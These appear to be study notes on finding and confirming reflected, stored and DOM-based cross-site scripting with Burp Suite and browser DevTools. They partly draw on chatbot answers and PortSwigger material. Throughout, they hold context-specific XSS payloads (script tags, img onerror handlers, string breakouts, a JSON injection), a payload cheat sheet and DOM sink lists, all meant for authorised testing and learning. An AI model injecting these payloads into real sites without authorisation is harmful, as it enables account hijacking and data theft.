    - Proxy → Options → Ensure the Proxy Listener is enabled (default is 127.0.0.1:8080).
    - Configure your browser to use Burp as a proxy.
2. ⚡ Submit your input in the web app (like `abc123xyz`).
3. 🕵️‍♂️ In Burp → Proxy → HTTP history, locate the request related to your input (search URL, timestamp, etc.).
4. 📝 Check the **response tab** in the HTTP request entry:
    - Search for `abc123xyz`.
5. ✅ If you see your marker reflected in the HTML response, the data is displayed somewhere.
6. 🔄 You can also use Burp Repeater to manipulate the request and test different payloads systematically.

---

### ✅ Example in Practice

Imagine you enter:

```Plain
<script>alert('XSS')</script>
```

After clicking “Search”:

- In **DevTools** → Elements tab → you search for `<script>alert('XSS')</script>` → If found → You know it’s reflected → Try in browser URL → See if alert pops.

Or:

- In **Burp Proxy HTTP history** → Find the request → Look in Response tab → Is your payload reflected as-is?

---

### ⚡ Pro Tips

- Make your marker easy to search, like:
    
    ```Plain
    marker123ABC
    ```
    
- Start with simple markers → Once confirmed, use real payloads.
- Use Burp’s **Grep Match** feature in Intruder to automatically flag when your marker appears in responses.

---

Let me explain exactly **how to choose the right payload** in the right context, and why specifically this payload works — all in a structured way, with technical clarity and practical reasoning.

---

## ✅ How to Choose the Right XSS Payload (Step-by-Step Mindset)

### 1️⃣ Step 1: Find Where Your Input Appears in the HTML

When your input is reflected in the page, **where exactly does it show up**?

### Example Contexts:

|Context|Example Reflection|
|---|---|
|HTML Body Text|`<p>YOUR INPUT</p>`|
|Attribute|`<img src="YOUR INPUT">`|
|Inline JS|`<script>var data = "YOUR INPUT";</script>`|
|Event Handlers|`<div onclick="YOUR INPUT">Click me</div>`|

---

### 2️⃣ Step 2: Pick Payloads Based on Context

### ✅ HTML Body Text

If your input appears as text inside the page body (e.g., inside `<p>` tags), you can use:

```HTML
<script>alert(1)</script>
```

Why? Because browsers will treat `<script>` tags as code and execute them.

---

### ✅ Attribute Context (e.g., `src`, `href`, `alt`)

If your input appears inside an attribute, like:

```HTML
<img src="YOUR INPUT">
```

Then, injecting a full `<script>` tag won’t work. Instead, use an event handler because attributes can execute JavaScript when triggered.

👉 Example payload:

```HTML
1" onerror="alert(1)
```

But in this specific lab, they used:

```HTML
<img src=1 onerror=alert(1)>
```

Why this works:

- `src=1` is an invalid image URL → causes an error.
- `onerror=alert(1)` is an event handler attached to the image → triggered when the image fails to load.
- Since the application does not sanitize the input, this executes the alert as soon as the page renders.

---

### ✅ Inline JavaScript Context

If your input appears inside a JS variable:

```JavaScript
var search = "YOUR INPUT";
```

You need to break out of the string:

```JavaScript
";alert(1);//
```

So that your payload becomes:

```JavaScript
var search = "";alert(1);//";
```

---

### 3️⃣ Step 3: Why `<img src=1 onerror=alert(1)>` Is Popular

- ✅ Simple to write.
- ✅ No need to break out of existing HTML/JS context.
- ✅ `img` tag always renders.
- ✅ Invalid `src` makes `onerror` trigger instantly.
- ✅ Easy to test: you get a visible alert popup.

---

## ✅ Example Flow You Should Follow

1. Find the input → See where your marker appears in the response (DevTools or Burp).
2. Identify its context:
    - Is it inside an attribute?
    - Is it inside HTML text?
    - Is it inside inline JS?
3. Pick a **candidate payload** based on context:
    - HTML: `<script>alert(1)</script>`
    - Attribute: `<img src=1 onerror=alert(1)>`
    - JS variable: `";alert(1);//`
4. Test in Repeater → Observe response → Test in browser → Check if payload runs.
5. If filtered, try bypass techniques (e.g., encoding).

---

## ✅ How to Train Your Thinking

Whenever you see a reflection:

👉 Ask yourself:

- “Where is my input displayed?”
- “Is it between tags, in an attribute, or inside JS?”
- “What payload shape works for this?”

💡 Example mental model:

|Location in HTML|Best Example Payload|
|---|---|
|Body Text|`<script>alert(1)</script>`|
|Attribute|`<img src=1 onerror=alert(1)>`|
|JS Code|`";alert(1);//`|
|Event Handler|`";alert(1);//` or `<div onclick=alert(1)>`|

---

## ✅ Visual Example

If this is reflected in HTML like this:

```HTML
<p>You searched for: abc123</p>
```

You can try:

```HTML
<script>alert(1)</script>
```

If this is reflected in an attribute:

```HTML
<img src="abc123">
```

You should try:

```HTML
1" onerror="alert(1)
```

Or just:

```HTML
<img src=1 onerror=alert(1)>
```

---

## ⚡ Final Pro Tip

👉 Don’t overthink initially.

Start with **simple payloads** → see if they reflect.

If not, look at the context → adjust payload → Test → Iterate.

---

# Cheat Sheet

Here is a comprehensive **XSS Payload Cheat Sheet** categorized by the context where your input appears. This will help you pick the correct payload every time you test for XSS.

---

## ✅ XSS Payload Cheat Sheet

|✅ Reflection Context|🎯 Example Reflection Location|💡 Payload Example|🔍 Why It Works|
|---|---|---|---|
|✅ HTML Body Text|`<div>YOUR INPUT</div>`|`<script>alert(1)</script>`|Simple script tag executed by browser.|
|✅ Attribute Context|`<img src="YOUR INPUT">`|`1" onerror="alert(1)` or `<img src=1 onerror=alert(1)>`|The `onerror` event triggers JS when the image fails to load.|
|✅ Inside Inline JS|`<script>var data = "YOUR INPUT";</script>`|`";alert(1);//`|Break out of string to execute JS.|
|✅ Event Handlers|`<div onclick="YOUR INPUT">Click me</div>`|`alert(1)` or `");alert(1);//`|Injects directly into event handler.|
|✅ URL Fragment (DOM XSS)|Accessed via `window.location.hash` or `.search`|`<img src=1 onerror=alert(1)>`|Gets injected into DOM via innerHTML or DOM methods.|
|✅ Data Attributes|`<div data-info="YOUR INPUT"></div>`|`" onmouseover="alert(1)`|Breaks out of attribute value and injects handler.|
|✅ CSS Context|`<style>body {background: YOUR INPUT;}</style>`|`url(javascript:alert(1))`|Some older browsers might allow JS in CSS URL. (Rare)|
|✅ JavaScript eval() Sink|`eval("...YOUR INPUT...")`|`");alert(1);//`|Ends string, injects JS, and comments out the rest.|
|✅ Base64 Encoded Content|`<img src="data:image/png;base64, YOUR INPUT">`|Exploits base64 injection (complex).|Rare but advanced; usually for advanced exploit dev.|
|✅ JSON Context|`{ "name": "YOUR INPUT" }`|`", "admin": true, "name": "`|Breaks JSON structure, injects data.|

---

## ✅ Example Practical Use Case

### Scenario 1: Simple Body Text Reflection

```HTML
<div>You searched for: abc123</div>
```

- Try payload:
    
    ```HTML
    <script>alert(1)</script>
    ```
    

---

### Scenario 2: Inside Attribute

```HTML
<img src="abc123">
```

- Try payload:
    
    ```HTML
    1" onerror="alert(1)
    ```
    

---

### Scenario 3: Inline JavaScript

```JavaScript
var query = "abc123";
```

- Try payload:
    
    ```JavaScript
    ";alert(1);//
    ```
    

---

### Scenario 4: URL Fragment (DOM XSS)

```JavaScript
document.getElementById('searchresult').innerHTML = location.search;
```

- Try payload:
    
    ```Plain
    ?q=<img src=1 onerror=alert(1)>
    ```
    

---

## ✅ Why These Work and When to Use Them

- 🎯 The **goal** is to make the browser execute arbitrary JavaScript.
- 🔧 The **payload depends on where your input is reflected**:
    - Between tags → `<script>alert(1)</script>`.
    - In attributes → use an event handler like `onerror`.
    - In JS code → break out of strings or structure.

---

## ✅ Pro Tip

👉 Always start by injecting a unique marker:

```HTML
abc123xyz
```

👉 Find where it appears (DevTools, Burp).

👉 Analyze the exact reflection context.

👉 Apply the right payload.

  

---

Here is a **detailed, step-by-step explanation** of how to find Cross-Site Scripting (XSS) vulnerabilities using Burp Suite, as demonstrated in the referenced video and reliable web sources:

---

## Preparation and Setup

## 1. **Install Burp Suite**

- Download Burp Suite from the official PortSwigger website. Choose the version (Community/Professional) that suits the need.[pixelqa](https://www.pixelqa.com/blog/post/getting-started-with-burp-suite-a-step-by-step-guide-to-identifying-sql-injection-and-xss-vulnerabilities)
- Install the application by following the on-screen instructions.[pixelqa](https://www.pixelqa.com/blog/post/getting-started-with-burp-suite-a-step-by-step-guide-to-identifying-sql-injection-and-xss-vulnerabilities)

## 2. **Configure the Proxy**

- Open Burp Suite. Set the browser (e.g., Firefox or Chrome) to use Burp Suite’s proxy (usually 127.0.0.1:8080).[portswigger+1](https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/testing-for-reflected-xss)
- This allows all web traffic from the browser to flow through Burp, so Burp can intercept, read, and modify requests and responses.[pixelqa](https://www.pixelqa.com/blog/post/getting-started-with-burp-suite-a-step-by-step-guide-to-identifying-sql-injection-and-xss-vulnerabilities)

## 3. **Enable Intercept Mode**

- In Burp Suite, go to the **Proxy** tab.
- Click "Intercept is on" so that Burp will pause and let you edit every HTTP request before it reaches the server.[pixelqa](https://www.pixelqa.com/blog/post/getting-started-with-burp-suite-a-step-by-step-guide-to-identifying-sql-injection-and-xss-vulnerabilities)

---

## Finding XSS Vulnerabilities

## 4. **Navigate and Identify Input Points**

- Browse the target web application in the proxied browser.[pixelqa](https://www.pixelqa.com/blog/post/getting-started-with-burp-suite-a-step-by-step-guide-to-identifying-sql-injection-and-xss-vulnerabilities)
- As you interact with login forms, search bars, comments, or any user input fields, Burp will show intercepted HTTP requests under the Proxy tab.[pixelqa](https://www.pixelqa.com/blog/post/getting-started-with-burp-suite-a-step-by-step-guide-to-identifying-sql-injection-and-xss-vulnerabilities)
- Examine requests for parameters (in the URL, POST data, cookies, etc.) that accept user-controlled data.[portswigger](https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/testing-for-reflected-xss)

## 5. **Check for Reflection**

- Identify if a parameter's value is reflected somewhere in the response (page content, error, URL).[portswigger](https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/testing-for-reflected-xss)
- Note the exact context (HTML, attribute, script, etc.) where the input appears in the response. This context determines the payload style.[portswigger](https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/testing-for-reflected-xss)

---

## 6. **Test for XSS Manually with Burp Repeater**

- Right-click on an interesting request in Proxy > HTTP history and select **Send to Repeater**.[portswigger](https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/testing-for-reflected-xss)
- In Repeater, tweak the input values by replacing them with an XSS payload, like:
    - `<script>alert(1)</script>`
    - `<img src=x onerror=alert(1)>`
- Click **Send** after editing the request.[portswigger](https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/testing-for-reflected-xss)

## a. **Analyze Responses**

- Look at the response in Repeater.
- If the output shows your injected payload unencoded, or if parts of the payload execute in the browser, this is potentially vulnerable.[portswigger](https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/testing-for-reflected-xss)

## b. **Proof of Concept**

- Use the right-click option "Show response in browser" to get a browser-ready URL.
- Paste this in the browser; if an alert pops up or other proof-of-concept behavior is visible, XSS is confirmed.[portswigger](https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/testing-for-reflected-xss)

---

## 7. **Automate and Extend with Burp Extensions**

- Use extensions like **XSS Validator**, **DOM Invader**, or **Sentinel** from the BApp Store to automate scanning and payload injection for both reflected and stored XSS.[github+1](https://github.com/snoopysecurity/awesome-burp-extensions)
- These tools fuzz parameters and validate if an injected script executes by using browser automation or headless browsers.[hackingarticles](https://www.hackingarticles.in/burp-suite-for-pentester-xss-validator/)

---

## 8. **Test for Stored (Persistent) XSS**

- Enter a unique payload in an input where data is likely to be stored (comments, profile fields, etc.).[portswigger](https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/testing-for-stored-xss)
- Use Burp to capture this insertion request and another request (or a later visit) where the payload might appear.[portswigger](https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/testing-for-stored-xss)
- Follow these in Repeater as a group and use the browser viewing trick to see if the payload executes when data is rendered.[portswigger](https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/testing-for-stored-xss)

---

## Finalizing and Reporting

## 9. **Verify and Report**

- Always re-test with various payloads to confirm vulnerability and bypass basic filters.youtube[portswigger](https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/testing-for-reflected-xss)
- Document the affected URLs, vulnerable parameters, injected payloads, and PoC screenshots.
- Write a clear report including steps for replication and your security recommendations.[pixelqa](https://www.pixelqa.com/blog/post/getting-started-with-burp-suite-a-step-by-step-guide-to-identifying-sql-injection-and-xss-vulnerabilities)

---

## Tips, Tricks, and Precautions

- Focus on **all possible input points**, including search bars, comment forms, hidden fields, and query strings.[portswigger+1](https://portswigger.net/web-security/cross-site-scripting/reflected)
- Use a combination of manual and automated methods for thoroughness.[portswigger](https://portswigger.net/web-security/cross-site-scripting)
- Always have permission or ensure testing is within legal/ethical bounds.
- Many sites filter basic payloads; attempt to bypass filters or use different script-less XSS methods if needed.youtube[portswigger](https://portswigger.net/web-security/cross-site-scripting)

---

## Example Burp Suite Manual XSS Workflow

|Step|Action|Details|
|---|---|---|
|Proxy Setup|Route browser traffic through Burp|Proxy 127.0.0.1:8080 [pixelqa+1](https://www.pixelqa.com/blog/post/getting-started-with-burp-suite-a-step-by-step-guide-to-identifying-sql-injection-and-xss-vulnerabilities)|
|Input Discovery|Browse site, trigger inputs|Capture/search in Burp Proxy [portswigger](https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/testing-for-reflected-xss)|
|Send to Repeater|Pick user-influenced requests|Right-click → Send to Repeater [portswigger](https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/testing-for-reflected-xss)|
|Inject Payload|Edit input value to payload|`<script>alert(1)</script>`, etc [portswigger](https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/testing-for-reflected-xss)|
|Check Response|Does output reflect payload?|Raw/HTML/JS context [portswigger](https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/testing-for-reflected-xss)|
|Browser PoC|Show response in browser|Proof of execution [portswigger](https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/testing-for-reflected-xss)|

---

With these detailed steps, each phase of manual and automated XSS detection using Burp Suite is explained clearly and completely.[hackingarticles+3](https://www.hackingarticles.in/burp-suite-for-pentester-xss-validator/)youtube

1. [https://www.pixelqa.com/blog/post/getting-started-with-burp-suite-a-step-by-step-guide-to-identifying-sql-injection-and-xss-vulnerabilities](https://www.pixelqa.com/blog/post/getting-started-with-burp-suite-a-step-by-step-guide-to-identifying-sql-injection-and-xss-vulnerabilities)
2. [https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/testing-for-reflected-xss](https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/testing-for-reflected-xss)
3. [https://github.com/snoopysecurity/awesome-burp-extensions](https://github.com/snoopysecurity/awesome-burp-extensions)
4. [https://www.hackingarticles.in/burp-suite-for-pentester-xss-validator/](https://www.hackingarticles.in/burp-suite-for-pentester-xss-validator/)
5. [https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/testing-for-stored-xss](https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/testing-for-stored-xss)
6. [https://www.youtube.com/watch?v=GJd77zMLpJU](https://www.youtube.com/watch?v=GJd77zMLpJU)
7. [https://portswigger.net/web-security/cross-site-scripting/reflected](https://portswigger.net/web-security/cross-site-scripting/reflected)
8. [https://portswigger.net/web-security/cross-site-scripting](https://portswigger.net/web-security/cross-site-scripting)
9. [https://portswigger.net/support/using-burp-to-find-cross-site-scripting-issues](https://portswigger.net/support/using-burp-to-find-cross-site-scripting-issues)
10. [https://portswigger.net/support/using-burp-to-manually-test-for-reflected-xss](https://portswigger.net/support/using-burp-to-manually-test-for-reflected-xss)
11. [https://www.hackerone.com/blog/how-find-xss](https://www.hackerone.com/blog/how-find-xss)
12. [https://www.vumetric.com/blog/how-to-find-xss-vulnerabilities/](https://www.vumetric.com/blog/how-to-find-xss-vulnerabilities/)
13. [https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss](https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss)
14. [https://portswigger.net/bappstore/98275a25394a417c9480f58740c1d981](https://portswigger.net/bappstore/98275a25394a417c9480f58740c1d981)
15. [https://www.youtube.com/watch?v=1SGfhslf0-Q](https://www.youtube.com/watch?v=1SGfhslf0-Q)
16. [https://www.youtube.com/watch?v=ecuiE83zvqY](https://www.youtube.com/watch?v=ecuiE83zvqY)
17. [https://portswigger.net/burp/documentation/desktop/tools/dom-invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader)
18. [https://www.browserstack.com/guide/xss-testing](https://www.browserstack.com/guide/xss-testing)
19. [https://portswigger.net/solutions/penetration-testing/penetration-testing-tools](https://portswigger.net/solutions/penetration-testing/penetration-testing-tools)
20. [https://www.gocodeo.com/post/how-to-use-burp-suite-for-manual-and-automated-vulnerability-scanning](https://www.gocodeo.com/post/how-to-use-burp-suite-for-manual-and-automated-vulnerability-scanning)

---

To find **reflected XSS** using Burp Suite, follow this detailed, step-by-step workflow with explanations for each phase:[portswigger+2](https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/testing-for-reflected-xss)

---

## Step 1: Configure Burp Proxy

- Set up Burp Suite and configure the browser to use Burp as an HTTP proxy (usually 127.0.0.1:8080).[portswigger](https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/testing-for-reflected-xss)
- This lets Burp intercept all browser requests, which is essential for analyzing inputs and responses.[portswigger](https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/testing-for-reflected-xss)

---

## Step 2: Explore the Application

- Browse through the target site, interacting with forms, search boxes, and any areas accepting user input.[portswigger](https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/testing-for-reflected-xss)
- Burp Proxy will capture all HTTP requests and responses, which are logged in the HTTP history.[portswigger](https://portswigger.net/support/using-burp-to-manually-test-for-reflected-xss)

---

## Step 3: Identify Input Points

- In Burp’s HTTP history, look for requests containing parameters whose values originate from user input (URL query parameters, POST data, etc.).[portswigger](https://portswigger.net/support/using-burp-to-find-cross-site-scripting-issues)
- Focus on places where user input might be reflected in the server's response.[portswigger](https://portswigger.net/support/using-burp-to-find-cross-site-scripting-issues)

---

## Step 4: Send Request to Repeater

- Right-click a relevant request in Proxy > HTTP history and choose **Send to Repeater** for manual testing.[portswigger](https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/testing-for-reflected-xss)
- The Repeater tool allows you to modify and resend requests and analyze responses easily.[portswigger](https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/testing-for-reflected-xss)

---

## Step 5: Inject XSS Payloads

- In Repeater, replace suspected parameter values with XSS payloads, e.g.,
    - `<script>alert('XSS')</script>`
    - `"><img src=x onerror=alert(1)>`
- Try simple and complex payloads depending on where the input is reflected (in HTML body, attribute, JS context, etc.).[portswigger](https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/testing-for-reflected-xss)

---

## Step 6: Analyze the Response

- Send the modified request and review the server’s response in Repeater.[portswigger](https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/testing-for-reflected-xss)
- Look for your payload appearing in the response, especially unencoded. Check its context (HTML body, attribute, JavaScript block, etc.).[portswigger](https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/testing-for-reflected-xss)
- If your payload is reflected without encoding and appears executable, this is a sign of reflected XSS.[portswigger+1](https://portswigger.net/support/using-burp-to-manually-test-for-reflected-xss)

---

## Step 7: Verify in Browser

- Burp provides an option: right-click > **Show response in browser**.
- Use this to test if the payload truly executes as JavaScript. If an alert or your script runs, the vulnerability is confirmed.[portswigger](https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/testing-for-reflected-xss)

---

## Step 8: Document the Finding

- Note the vulnerable URL, parameter, exact payload used, and proof (like a screenshot or screen recording).[portswigger](https://portswigger.net/support/using-burp-to-manually-test-for-reflected-xss)
- Indicate the context (where/how the payload appears) and possible attack scenario.[portswigger](https://portswigger.net/support/using-burp-to-manually-test-for-reflected-xss)

---

## Quick Reference Table

|Step|Description|
|---|---|
|Configure Proxy|Route browser traffic through Burp|
|Explore Application|Interact with input areas/forms|
|Identify Inputs|Look for user-controllable parameters in HTTP history|
|Send to Repeater|Prepare request for modification and analysis|
|Inject Payload|Enter XSS payloads in parameter values|
|Analyze Response|Check for reflected, unencoded payloads in response|
|Verify in Browser|Confirm script execution in real browser context|
|Document Finding|Record evidence and details for reporting|

---

By following this workflow, reflected XSS can be reliably detected and verified using Burp Suite.[portswigger+2](https://portswigger.net/support/using-burp-to-find-cross-site-scripting-issues)

1. [https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/testing-for-reflected-xss](https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/testing-for-reflected-xss)
2. [https://portswigger.net/support/using-burp-to-manually-test-for-reflected-xss](https://portswigger.net/support/using-burp-to-manually-test-for-reflected-xss)
3. [https://portswigger.net/support/using-burp-to-find-cross-site-scripting-issues](https://portswigger.net/support/using-burp-to-find-cross-site-scripting-issues)

--- The following are some of the main sinks that can lead to DOM-XSS vulnerabilities:
document.write()
document.writeln()
document.domain
element.innerHTML
element.outerHTML
element.insertAdjacentHTML
element.onevent

The following jQuery functions are also sinks that can lead to DOM-XSS vulnerabilities:
add()
after()
append()
animate()
insertAfter()
insertBefore()
before()
html()
prepend()
replaceAll()
replaceWith()
wrap()
wrapInner()
wrapAll()
has()
constructor()
init()
index()
jQuery.parseHTML()
$.parseHTML()

DOM-based XSS
In this section, we'll describe DOM-based cross-site scripting (DOM XSS), explain how to find DOM XSS vulnerabilities, and talk about how to exploit DOM XSS with different sources and sinks.

What is DOM-based cross-site scripting?
DOM-based XSS vulnerabilities usually arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes it to a sink that supports dynamic code execution, such as eval() or innerHTML. This enables attackers to execute malicious JavaScript, which typically allows them to hijack other users' accounts.

To deliver a DOM-based XSS attack, you need to place data into a source so that it is propagated to a sink and causes execution of arbitrary JavaScript.

The most common source for DOM XSS is the URL, which is typically accessed with the window.location object. An attacker can construct a link to send a victim to a vulnerable page with a payload in the query string and fragment portions of the URL. In certain circumstances, such as when targeting a 404 page or a website running PHP, the payload can also be placed in the path.

For a detailed explanation of the taint flow between sources and sinks, please refer to the DOM-based vulnerabilities page.

How to test for DOM-based cross-site scripting
The majority of DOM XSS vulnerabilities can be found quickly and reliably using Burp Suite's web vulnerability scanner. To test for DOM-based cross-site scripting manually, you generally need to use a browser with developer tools, such as Chrome. You need to work through each available source in turn, and test each one individually.

Testing HTML sinks
To test for DOM XSS in an HTML sink, place a random alphanumeric string into the source (such as location.search), then use developer tools to inspect the HTML and find where your string appears. Note that the browser's "View source" option won't work for DOM XSS testing because it doesn't take account of changes that have been performed in the HTML by JavaScript. In Chrome's developer tools, you can use Control+F (or Command+F on MacOS) to search the DOM for your string.

For each location where your string appears within the DOM, you need to identify the context. Based on this context, you need to refine your input to see how it is processed. For example, if your string appears within a double-quoted attribute then try to inject double quotes in your string to see if you can break out of the attribute.

Note that browsers behave differently with regards to URL-encoding, Chrome, Firefox, and Safari will URL-encode location.search and location.hash, while IE11 and Microsoft Edge (pre-Chromium) will not URL-encode these sources. If your data gets URL-encoded before being processed, then an XSS attack is unlikely to work.

Testing JavaScript execution sinks
Testing JavaScript execution sinks for DOM-based XSS is a little harder. With these sinks, your input doesn't necessarily appear anywhere within the DOM, so you can't search for it. Instead you'll need to use the JavaScript debugger to determine whether and how your input is sent to a sink.

For each potential source, such as location, you first need to find cases within the page's JavaScript code where the source is being referenced. In Chrome's developer tools, you can use Control+Shift+F (or Command+Alt+F on MacOS) to search all the page's JavaScript code for the source.

Once you've found where the source is being read, you can use the JavaScript debugger to add a break point and follow how the source's value is used. You might find that the source gets assigned to other variables. If this is the case, you'll need to use the search function again to track these variables and see if they're passed to a sink. When you find a sink that is being assigned data that originated from the source, you can use the debugger to inspect the value by hovering over the variable to show its value before it is sent to the sink. Then, as with HTML sinks, you need to refine your input to see if you can deliver a successful XSS attack.

Testing for DOM XSS using DOM Invader
Identifying and exploiting DOM XSS in the wild can be a tedious process, often requiring you to manually trawl through complex, minified JavaScript. If you use Burp's browser, however, you can take advantage of its built-in DOM Invader extension, which does a lot of the hard work for you.

Read more
DOM Invader documentation
Exploiting DOM XSS with different sources and sinks
In principle, a website is vulnerable to DOM-based cross-site scripting if there is an executable path via which data can propagate from source to sink. In practice, different sources and sinks have differing properties and behavior that can affect exploitability, and determine what techniques are necessary. Additionally, the website's scripts might perform validation or other processing of data that must be accommodated when attempting to exploit a vulnerability. There are a variety of sinks that are relevant to DOM-based vulnerabilities. Please refer to the list below for details.

The document.write sink works with script elements, so you can use a simple payload, such as the one below:

document.write('... <script>alert(document.domain)</script> ...');